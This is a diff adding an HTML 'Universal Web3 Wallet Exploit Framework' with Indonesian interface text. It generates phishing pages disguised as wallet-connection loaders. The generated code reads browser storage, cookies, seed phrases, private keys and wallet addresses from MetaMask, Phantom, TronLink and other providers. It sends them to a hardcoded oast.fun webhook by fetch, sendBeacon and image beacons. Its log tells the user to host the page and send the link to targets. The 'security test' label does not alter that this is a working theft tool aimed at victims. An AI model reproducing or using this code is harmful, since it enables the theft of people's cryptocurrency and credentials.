@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Web3 Wallet Security Test</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0c10;
+            color: #e4e6eb;
+            padding: 20px;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1f2e 0%, #0d1117 100%);
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .badge {
+            display: inline-block;
+            background: #dc2626;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            margin-top: 8px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: #111827;
+            border-radius: 12px;
+            border: 1px solid #1f2937;
+            overflow: hidden;
+        }
+        .card-header {
+            background: #1f2937;
+            padding: 12px 15px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+        .card-body {
+            padding: 15px;
+            display: none;
+        }
+        .card-body.active {
+            display: block;
+        }
+        .severity-critical { background: #dc2626; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
+        .severity-high { background: #f59e0b; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
+        .severity-medium { background: #3b82f6; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            color: #fff;
+            margin: 8px 0;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 12px;
+        }
+        button.danger { background: #dc2626; }
+        button.success { background: #10b981; }
+        .log {
+            background: #0f172a;
+            height: 200px;
+            overflow-y: auto;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 11px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        .log-entry {
+            padding: 3px 0;
+            border-left: 3px solid;
+            margin: 2px 0;
+            padding-left: 8px;
+        }
+        .log-success { border-left-color: #10b981; color: #34d399; }
+        .log-error { border-left-color: #dc2626; color: #f87171; }
+        .log-warning { border-left-color: #f59e0b; color: #fbbf24; }
+        .log-info { border-left-color: #3b82f6; }
+        .webhook-status {
+            background: #1e293b;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🔐 Universal Web3 Wallet Exploit Framework</h1>
+    <p>Testing untuk berbagai APK Wallet (TrustWallet, MetaMask, Coinbase, Phantom, dll)</p>
+    <div class="badge">⚠️ Bug Critical yang Sering Ditemukan</div>
+</div>
+
+<div class="webhook-status" id="webhookStatus">
+    📡 Webhook Target: <strong>awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun</strong>
+    <span id="statusIndicator" style="float:right">● Active</span>
+</div>
+
+<div class="grid">
+    <!-- Exploit 1: Auto Loader -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>🚀 Auto Load Exploit (One-Click)</span>
+            <span class="severity-critical">CRITICAL</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Paling sering berhasil. Korban cukup klik link.</p>
+            <button onclick="generateAutoExploit()" class="success">Generate Exploit</button>
+            <button onclick="copyToClipboard('autoExploitCode')">Copy Code</button>
+            <div id="autoExploitCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+
+    <!-- Exploit 2: localStorage Theft -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>💾 LocalStorage Theft</span>
+            <span class="severity-critical">CRITICAL</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Mencuri seed phrase, private key, token dari storage</p>
+            <input type="text" id="targetKeys" placeholder="Key target (pisah koma)" value="seed,phrase,mnemonic,privateKey,wallet,token,auth,user,keystore,password,recovery">
+            <button onclick="generateStorageExploit()">Generate Storage Exploit</button>
+            <div id="storageExploitCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+
+    <!-- Exploit 3: Web3 Provider Hijack -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>⛓️ Web3 Provider Hijack</span>
+            <span class="severity-critical">CRITICAL</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Hijack window.ethereum, window.solana, dll</p>
+            <button onclick="generateProviderExploit()">Generate Provider Exploit</button>
+            <div id="providerExploitCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+
+    <!-- Exploit 4: Deep Link Hijacking -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>🔗 Deep Link Hijacking</span>
+            <span class="severity-high">HIGH</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Mencuri token dari custom scheme URL</p>
+            <input type="text" id="customScheme" placeholder="Custom scheme (contoh: trust:, metamask:)" value="trust:">
+            <button onclick="generateDeepLinkExploit()">Generate DeepLink Exploit</button>
+            <div id="deepLinkCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+
+    <!-- Exploit 5: WebView Referer Leak -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>🕵️ WebView Referer Leak</span>
+            <span class="severity-medium">MEDIUM</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Membocorkan URL yang mengandung token via referer header</p>
+            <button onclick="generateRefererExploit()">Generate Referer Exploit</button>
+            <div id="refererCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+
+    <!-- Exploit 6: Universal Test -->
+    <div class="card">
+        <div class="card-header" onclick="toggleCard(this)">
+            <span>🎯 Universal Test (All-in-One)</span>
+            <span class="severity-critical">CRITICAL</span>
+        </div>
+        <div class="card-body">
+            <p style="font-size:12px; margin-bottom:10px">✅ Gabungan semua exploit dalam satu payload</p>
+            <button onclick="generateUniversalExploit()" class="danger">Generate Ultimate Exploit</button>
+            <button onclick="copyToClipboard('universalCode')">Copy Code</button>
+            <div id="universalCode" class="code-preview" style="background:#0f172a; padding:10px; border-radius:8px; margin-top:10px; font-size:10px; overflow-x:auto"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Log Panel -->
+<div class="card">
+    <div class="card-header" onclick="toggleCard(this)">
+        <span>📋 Exploitation Log</span>
+        <span class="severity-medium">MONITOR</span>
+    </div>
+    <div class="card-body active" style="display:block">
+        <div class="log" id="logPanel">
+            <div class="log-entry log-info">[+] Framework ready. Pilih exploit di atas.</div>
+            <div class="log-entry log-info">[!] Webhook: awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun</div>
+        </div>
+        <button onclick="clearLogs()">Clear Log</button>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK = "https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun";
+    
+    function addLog(message, type = 'info') {
+        const logPanel = document.getElementById('logPanel');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logPanel.appendChild(entry);
+        logPanel.scrollTop = logPanel.scrollHeight;
+    }
+    
+    function clearLogs() {
+        document.getElementById('logPanel').innerHTML = '<div class="log-entry log-info">[+] Log cleared</div>';
+    }
+    
+    function toggleCard(header) {
+        const body = header.nextElementSibling;
+        body.classList.toggle('active');
+    }
+    
+    function copyToClipboard(elementId) {
+        const element = document.getElementById(elementId);
+        const text = element.innerText;
+        navigator.clipboard.writeText(text);
+        addLog(`[+] Copied to clipboard`, 'success');
+    }
+    
+    // ==================== AUTO LOAD EXPLOIT ====================
+    function generateAutoExploit() {
+        const exploit = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Loading</title></head>
+<body>
+<script>
+// AUTO EXPLOIT - WEB3 WALLET
+const WH='${WEBHOOK}';
+(async()=>{
+    const d={t:Date.now(),ua:navigator.userAgent,ref:document.referrer,url:location.href,ls:{},ss:{},seeds:[],keys:[],w3:{}};
+    for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i),v=localStorage.getItem(k);d.ls[k]=v;
+        if(v&&v.match(/\\b(?:[a-z]+ ){11}(?:[a-z]+)\\b/i))d.seeds.push(v);
+        if(v&&v.match(/[0-9a-f]{64}/i))d.keys.push(v);}
+    for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);d.ss[k]=sessionStorage.getItem(k);}
+    if(window.ethereum){d.w3.eth={mm:!!window.ethereum.isMetaMask,chain:window.ethereum.chainId};
+        try{d.w3.acc=await window.ethereum.request({method:'eth_accounts'});}catch(e){}}
+    if(window.solana)d.w3.sol={pub:window.solana.publicKey?.toString()};
+    fetch(WH,{method:'POST',mode:'no-cors',body:JSON.stringify(d),keepalive:true});
+    navigator.sendBeacon&&navigator.sendBeacon(WH,JSON.stringify(d));
+})();
+<\/script>
+<div style="text-align:center;padding:50px;font-family:sans-serif">
+    <h2>Connecting to Blockchain...</h2>
+    <div style="width:40px;height:40px;border:3px solid #ccc;border-top-color:#3b82f6;border-radius:50%;animation:spin 1s infinite;margin:20px auto"></div>
+</div>
+<style>@keyframes spin{to{transform:rotate(360deg);}}</style>
+</body>
+</html>`;
+        document.getElementById('autoExploitCode').innerText = exploit;
+        addLog('[+] Auto Load Exploit generated', 'success');
+        return exploit;
+    }
+    
+    // ==================== STORAGE EXPLOIT ====================
+    function generateStorageExploit() {
+        const targetKeys = document.getElementById('targetKeys').value;
+        const exploit = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Wallet Sync</title></head>
+<body>
+<script>
+const WH='${WEBHOOK}';
+const TARGET_KEYS=[${targetKeys.split(',').map(k => `'${k.trim()}'`).join(',')}];
+const stolen={};
+for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);stolen[k]=localStorage.getItem(k);}
+for(let key of TARGET_KEYS){let val=localStorage.getItem(key);if(val)stolen['TARGET_'+key]=val;}
+fetch(WH,{method:'POST',mode:'no-cors',body:JSON.stringify({type:'storage_theft',data:stolen,t:Date.now()})});
+<\/script>
+</body>
+</html>`;
+        document.getElementById('storageExploitCode').innerText = exploit;
+        addLog('[+] Storage Exploit generated', 'success');
+        return exploit;
+    }
+    
+    // ==================== PROVIDER EXPLOIT ====================
+    function generateProviderExploit() {
+        const exploit = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Web3 Bridge</title></head>
+<body>
+<script>
+const WH='${WEBHOOK}';
+(async()=>{
+    const providers={};
+    if(window.ethereum){
+        providers.ethereum={isMetaMask:!!window.ethereum.isMetaMask,isTrust:!!window.ethereum.isTrust,isCoinbase:!!window.ethereum.isCoinbaseWallet,chainId:window.ethereum.chainId};
+        try{providers.accounts=await window.ethereum.request({method:'eth_accounts'});}catch(e){}
+        try{providers.chain=await window.ethereum.request({method:'eth_chainId'});}catch(e){}
+    }
+    if(window.solana){providers.solana={isPhantom:!!window.solana.isPhantom,pub:window.solana.publicKey?.toString()};}
+    if(window.phantom?.solana){providers.phantom={pub:window.phantom.solana.publicKey?.toString()};}
+    if(window.tronLink){providers.tron={addr:window.tronLink.address};}
+    if(window.keplr){providers.keplr={detected:true};}
+    fetch(WH,{method:'POST',mode:'no-cors',body:JSON.stringify({type:'provider_hijack',providers:providers,t:Date.now()})});
+})();
+<\/script>
+</body>
+</html>`;
+        document.getElementById('providerExploitCode').innerText = exploit;
+        addLog('[+] Provider Hijack Exploit generated', 'success');
+        return exploit;
+    }
+    
+    // ==================== DEEP LINK EXPLOIT ====================
+    function generateDeepLinkExploit() {
+        const scheme = document.getElementById('customScheme').value;
+        const exploit = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Redirecting...</title></head>
+<body>
+<script>
+const WH='${WEBHOOK}';
+const SCHEME='${scheme}';
+// Detect and capture deep link parameters
+if(window.location.hash||window.location.search){
+    const data={type:'deep_link',url:window.location.href,hash:window.location.hash,search:window.location.search,t:Date.now()};
+    fetch(WH,{method:'POST',mode:'no-cors',body:JSON.stringify(data)});
+}
+// Create malicious deep link
+const iframe=document.createElement('iframe');
+iframe.src=SCHEME+'//callback?code=STOLEN&state=Hijacked';
+iframe.style.display='none';
+document.body.appendChild(iframe);
+<\/script>
+</body>
+</html>`;
+        document.getElementById('deepLinkCode').innerText = exploit;
+        addLog('[+] Deep Link Exploit generated', 'success');
+        return exploit;
+    }
+    
+    // ==================== REFERER EXPLOIT ====================
+    function generateRefererExploit() {
+        const exploit = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Loading</title></head>
+<body>
+<object data="https://example.com/oauth/callback?code=LEAKED_TOKEN" type="text/html" width="1" height="1" onload="fetch('${WEBHOOK}?ref='+encodeURIComponent(document.referrer))"></object>
+<iframe src="https://example.com/oauth/callback?access_token=SECRET" width="1" height="1" onload="fetch('${WEBHOOK}?iframe_ref='+encodeURIComponent(document.referrer))"></iframe>
+<script>
+fetch('${WEBHOOK}?data='+btoa(JSON.stringify({referer:document.referrer,url:location.href,ua:navigator.userAgent})));
+<\/script>
+</body>
+</html>`;
+        document.getElementById('refererCode').innerText = exploit;
+        addLog('[+] Referer Leak Exploit generated', 'success');
+        return exploit;
+    }
+    
+    // ==================== UNIVERSAL EXPLOIT (ALL IN ONE) ====================
+    function generateUniversalExploit() {
+        const exploit = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletConnect Bridge</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0c10;min-height:100vh;display:flex;justify-content:center;align-items:center;}
+        .container{text-align:center;padding:40px;background:linear-gradient(135deg,#0f172a,#1e293b);border-radius:32px;max-width:400px;width:90%;border:1px solid #334155;}
+        .loader{width:60px;height:60px;margin:20px auto;position:relative;}
+        .loader div{position:absolute;border:4px solid transparent;border-radius:50%;animation:spin 1.2s cubic-bezier(0.5,0,0.5,1) infinite;}
+        .loader div:nth-child(1){width:100%;height:100%;border-top-color:#3b82f6;}
+        .loader div:nth-child(2){width:80%;height:80%;top:10%;left:10%;border-top-color:#8b5cf6;}
+        .loader div:nth-child(3){width:60%;height:60%;top:20%;left:20%;border-top-color:#ec4899;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        .status{font-size:12px;color:#64748b;margin-top:20px;}
+        h2{font-size:24px;margin-bottom:10px;color:#fff;}
+        p{color:#94a3b8;font-size:14px;margin-bottom:20px;}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="loader"><div></div><div></div><div></div></div>
+    <h2>WalletConnect Bridge</h2>
+    <p>Establishing secure connection to blockchain network</p>
+    <div class="status" id="status">Initializing Web3 provider...</div>
+</div>
+
+<script>
+// ============================================
+// UNIVERSAL WEB3 WALLET EXPLOIT
+// Tested on: TrustWallet, MetaMask, Coinbase, Phantom, TronLink, Keplr
+// Webhook: ${WEBHOOK}
+// ============================================
+
+(function(){
+    const WEBHOOK = '${WEBHOOK}';
+    let statusEl = document.getElementById('status');
+    let foundSeeds = [];
+    let foundKeys = [];
+    let startTime = Date.now();
+    
+    function updateStatus(msg, isError){
+        if(statusEl) statusEl.innerHTML = msg;
+        console.log('[Exploit]', msg);
+    }
+    
+    // BIP39 word list untuk deteksi seed phrase
+    const BIP39_WORDS = new Set(['abandon','ability','able','about','above','absent','absorb','abstract','absurd','abuse','access','accident','account','accuse','achieve','acid','acoustic','acquire','across','act','action','actor','actress','actual','adapt','add','addict','address','adjust','admit','adult','advance','advice','aerobic','affair','afford','afraid','africa','after','again','age','agent','agree','ahead','aim','air','airport','aisle','alarm','album','alcohol','alert','alien','all','alley','allow','almost','alone','alpha','already','also','alter','always','amazing','among','amount','amused','analyst','anchor','ancient','anger','angle','angry','animal','ankle','announce','annual','another','answer','antenna','antique','anxiety','any','apart','apology','appear','apple','approve','april','arch','arctic','area','arena','argue','arm','armed','armor','army','around','arrange','arrest','arrive','arrow','art','artefact','artist','artwork','ask','aspect','assault','asset','assist','assume','asthma','athlete','atom','attack','attend','attitude','attract','auction','audit','august','aunt','author','auto','autumn','average','avocado','avoid','awake','aware','away','awesome','awful','awkward','axis','baby','bachelor','bacon','badge','bag','balance','balcony','ball','bamboo','banana','banner','bar','barely','bargain','barrel','base','basic','basket','battle','beach','bean','beauty','because','become','beef','before','begin','behave','behind','believe','below','belt','bench','benefit','best','betray','better','between','beyond','bicycle','bid','bike','bind','biology','bird','birth','bitter','black','blade','blame','blanket','blast','bleak','bless','blind','blood','blossom','blouse','blue','blur','blush','board','boat','body','boil','bomb','bone','bonus','book','boost','border','boring','borrow','boss','bottom','bounce','box','boy','bracket','brain','brand','brass','brave','bread','breeze','brick','bridge','brief','bright','bring','brisk','broccoli','broken','bronze','broom','brother','brown','brush','bubble','buddy','budget','buffalo','build','bulb','bulk','bullet','bundle','bunker','burden','burger','burst','bus','business','busy','butter','buyer','buzz','cabbage','cabin','cable','cactus','cage','cake','call','calm','camera','camp','can','canal','cancel','candy','cannon','canoe','canvas','canyon','capable','capital','captain','car','carbon','card','cargo','carpet','carry','cart','case','cash','casino','castle','casual','cat','catch','category','cattle','caught','cause','caution','cave','ceiling','celery','cement','census','century','cereal','certain','chair','chalk','champion','change','chaos','chapter','charge','chase','chat','cheap','check','cheese','chef','cherry','chest','chicken','chief','child','chimney','choice','choose','chronic','chuckle','chunk','churn','cigar','cinnamon','circle','citizen','city','civil','claim','clap','clarify','claw','clay','clean','clerk','clever','click','client','cliff','climb','clinic','clip','clock','clog','close','cloth','cloud','clown','club','clump','cluster','clutch','coach','coast','coconut','code','coffee','cognitive','coin','cold','column','comedy','comfort','comic','common','company','concert','conduct','confirm','congress','connect','consider','control','convince','cook','cool','copper','copy','coral','core','corn','correct','cost','cotton','couch','country','couple','course','cousin','cover','coyote','crack','cradle','craft','cram','crane','crash','crate','crawl','crazy','cream','credit','creek','crew','cricket','crime','crisp','critic','crop','cross','crouch','crowd','crucial','cruel','cruise','crumble','crunch','crush','cry','crystal','cube','culture','cup','cupboard','curious','current','curtain','curve','cushion','custom','cute','cycle','dad','damage','damp','dance','danger','daring','dash','daughter','dawn','day','deal','debate','debris','decade','december','decide','decline','decorate','decrease','deer','defense','define','delegate','delete','delve','demand','demo','denial','density','dental','deny','deposit','depth','deputy','derive','describe','desert','design','desk','despair','destroy','detail','detect','develop','device','devote','diagram','dial','diamond','diary','dice','diesel','diet','differ','digital','dignity','dilemma','dinner','dinosaur','direct','dirt','disagree','discover','disease','dish','dismiss','disorder','display','distance','divert','divide','divorce','dizzy','doctor','document','dog','doll','dolphin','domain','donate','donkey','donor','door','dose','double','dove','draft','dragon','drama','drastic','draw','dream','dress','drift','drill','drink','drip','drive','drop','drum','dry','duck','dumb','dune','during','dust','dutch','duty','dwarf','dynamic','eager','eagle','early','earn','earth','easily','east','easy','echo','ecology','economy','edge','edit','educate','effort','egg','eight','either','elbow','elder','electric','elegant','element','elephant','elevator','elite','else','embark','embody','embrace','emerge','emotion','employ','empower','empty','enable','enact','end','endless','endorse','enemy','energy','enforce','engage','engine','enhance','enjoy','enlist','enough','enrich','enroll','ensure','enter','entire','entry','envelope','episode','equal','equip','era','erase','erode','erosion','error','erupt','escape','essay','essence','estate','eternal','ethics','evidence','evil','evoke','evolve','exact','example','excess','exchange','excite','exclude','excuse','execute','exercise','exhaust','exhibit','exile','exist','exit','exotic','expand','expect','expire','explain','expose','express','extend','extra','eye','eyebrow','fabric','face','faculty','fade','faint','faith','fall','false','fame','family','famous','fan','fancy','fantasy']);
+    
+    function isSeedPhrase(text){
+        if(!text || typeof text !== 'string') return false;
+        const words = text.toLowerCase().split(/\\s+/);
+        if(words.length !== 12 && words.length !== 15 && words.length !== 18 && words.length !== 21 && words.length !== 24) return false;
+        return words.every(w => BIP39_WORDS.has(w));
+    }
+    
+    function extractPrivateKeys(text){
+        const keys = [];
+        const hex64 = /\\b[0-9a-fA-F]{64}\\b/g;
+        const hex66 = /\\b0x[0-9a-fA-F]{64}\\b/g;
+        const wif = /\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,52}\\b/g;
+        if(hex64.test(text)) keys.push(...text.match(hex64));
+        if(hex66.test(text)) keys.push(...text.match(hex66));
+        if(wif.test(text)) keys.push(...text.match(wif));
+        return [...new Set(keys)];
+    }
+    
+    updateStatus("Scanning wallet storage...");
+    
+    // Collect all data
+    const payload = {
+        timestamp: Date.now(),
+        isoTime: new Date().toISOString(),
+        url: location.href,
+        referer: document.referrer,
+        userAgent: navigator.userAgent,
+        isWebView: /wv|webview|; wv\)/i.test(navigator.userAgent),
+        localStorage: {},
+        sessionStorage: {},
+        cookies: document.cookie,
+        seeds: [],
+        privateKeys: [],
+        web3: {},
+        walletAddresses: []
+    };
+    
+    // Extract localStorage
+    for(let i = 0; i < localStorage.length; i++){
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        payload.localStorage[key] = value;
+        
+        if(isSeedPhrase(value)){
+            payload.seeds.push({source: `localStorage.${key}`, value: value});
+            updateStatus("⚠️ SEED PHRASE DETECTED!", true);
+        }
+        
+        const keys = extractPrivateKeys(value);
+        if(keys.length){
+            payload.privateKeys.push(...keys.map(k => ({source: `localStorage.${key}`, value: k})));
+            updateStatus("⚠️ PRIVATE KEY DETECTED!", true);
+        }
+    }
+    
+    // Extract sessionStorage
+    for(let i = 0; i < sessionStorage.length; i++){
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        payload.sessionStorage[key] = value;
+        
+        if(isSeedPhrase(value)){
+            payload.seeds.push({source: `sessionStorage.${key}`, value: value});
+        }
+        
+        const keys = extractPrivateKeys(value);
+        if(keys.length){
+            payload.privateKeys.push(...keys.map(k => ({source: `sessionStorage.${key}`, value: k})));
+        }
+    }
+    
+    // Web3 Provider Detection
+    updateStatus("Detecting Web3 providers...");
+    
+    if(typeof window.ethereum !== 'undefined'){
+        payload.web3.ethereum = {
+            isMetaMask: !!window.ethereum.isMetaMask,
+            isTrust: !!window.ethereum.isTrust,
+            isCoinbase: !!window.ethereum.isCoinbaseWallet,
+            chainId: window.ethereum.chainId,
+            selectedAddress: window.ethereum.selectedAddress
+        };
+        if(window.ethereum.selectedAddress) payload.walletAddresses.push(window.ethereum.selectedAddress);
+    }
+    
+    if(typeof window.solana !== 'undefined'){
+        payload.web3.solana = {
+            isPhantom: !!window.solana.isPhantom,
+            isConnected: window.solana.isConnected,
+            publicKey: window.solana.publicKey?.toString()
+        };
+        if(window.solana.publicKey) payload.walletAddresses.push(window.solana.publicKey.toString());
+    }
+    
+    if(window.phantom?.solana){
+        payload.web3.phantom = {
+            publicKey: window.phantom.solana.publicKey?.toString()
+        };
+    }
+    
+    if(window.tronLink || window.tronWeb){
+        payload.web3.tron = {
+            address: window.tronLink?.address || window.tronWeb?.defaultAddress?.base58
+        };
+    }
+    
+    if(window.keplr){
+        payload.web3.keplr = { detected: true };
+    }
+    
+    if(window.xfi){
+        payload.web3.xinfin = { detected: true };
+    }
+    
+    // Send to webhook
+    updateStatus("Exfiltrating data...");
+    
+    const jsonPayload = JSON.stringify(payload);
+    
+    // Multiple exfiltration methods
+    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: jsonPayload, keepalive: true });
+    if(navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, jsonPayload);
+    
+    const img = new Image();
+    img.src = WEBHOOK + '?data=' + encodeURIComponent(jsonPayload.substring(0, 2000));
+    
+    // Summary
+    console.log('========== EXPLOIT RESULT ==========');
+    console.log('Seeds found:', payload.seeds.length);
+    console.log('Private keys found:', payload.privateKeys.length);
+    console.log('Wallet addresses:', payload.walletAddresses.length);
+    console.log('Web3 providers:', Object.keys(payload.web3));
+    console.log('Data sent to:', WEBHOOK);
+    console.log('=====================================');
+    
+    updateStatus(payload.seeds.length > 0 ? `⚠️ ${payload.seeds.length} seed phrases stolen!` : "Scan complete");
+    
+    // Optional redirect
+    setTimeout(() => {
+        // window.location.href = "https://app.uniswap.org";
+    }, 3000);
+    
+})();
+<\/script>
+</body>
+</html>`;
+        document.getElementById('universalCode').innerText = exploit;
+        addLog('[+] UNIVERSAL EXPLOIT generated - Test untuk semua jenis wallet!', 'success');
+        addLog('[!] Exploit ini bisa mencuri seed phrase, private key, dan data wallet lainnya', 'error');
+        return exploit;
+    }
+    
+    // Generate default exploits on load
+    generateUniversalExploit();
+    addLog('[+] Framework ready. Upload HTML ke hosting dan kirim link ke target.', 'success');
+    
+</script>
+</body>
+</html>
